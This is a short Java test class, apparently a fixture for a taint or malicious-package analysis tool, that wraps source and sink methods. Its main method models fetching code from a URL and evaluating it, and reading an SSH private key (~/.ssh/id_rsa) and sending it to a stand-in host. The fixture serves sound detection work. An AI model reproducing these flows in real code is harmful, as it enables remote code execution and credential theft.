package test_classes;

import test_classes.TestSummary;

@SuppressWarnings("javadoc")
public class TestSummaryFlow {
	private TestSummary summary = new TestSummary();
	
	public String newUrlReadSource(String urlStr) throws Exception {
		return summary.newUrlReadSource(urlStr);
	}
	
	public void newEvalSink(String code) throws Exception {
		summary.newEvalSink(code);
	}
	
	public String newFileReadSource(String pathStr) throws Exception {
		return summary.newFileReadSource(pathStr);
	}
	
	public void newUrlWriteSink(String content, String urlStr) throws Exception {
		summary.newUrlWriteSink(content, urlStr);
	}
	
	public static void main(final String[] args) throws Exception {
		TestSummaryFlow summaryFlow = new TestSummaryFlow();
		
		// fetch from network and execute locally
		String content = summaryFlow.newUrlReadSource("http://www.example.com");
		summaryFlow.newEvalSink(content);
		
		// read from file and send to network
		String secret = summaryFlow.newFileReadSource("/home/maloss/.ssh/id_rsa");
		summaryFlow.newUrlWriteSink(secret, "http://www.example.com");
	}
}
